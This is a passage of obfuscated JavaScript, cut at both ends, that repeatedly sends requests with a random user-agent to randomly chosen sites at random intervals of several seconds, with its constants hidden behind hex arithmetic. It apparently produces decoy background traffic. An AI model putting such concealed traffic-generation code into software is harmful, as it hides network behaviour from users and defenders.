    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (0x26 * 0x3 + -0x2b0a + 0x45f0) * getRandomInt(-0x14d8 + 0x9c5 + 0xb14, -0xea9 + -0x26e + -0x92 * -0x1e));
}, -0x1b9d + 0x58f * -0x1 + 0x2190);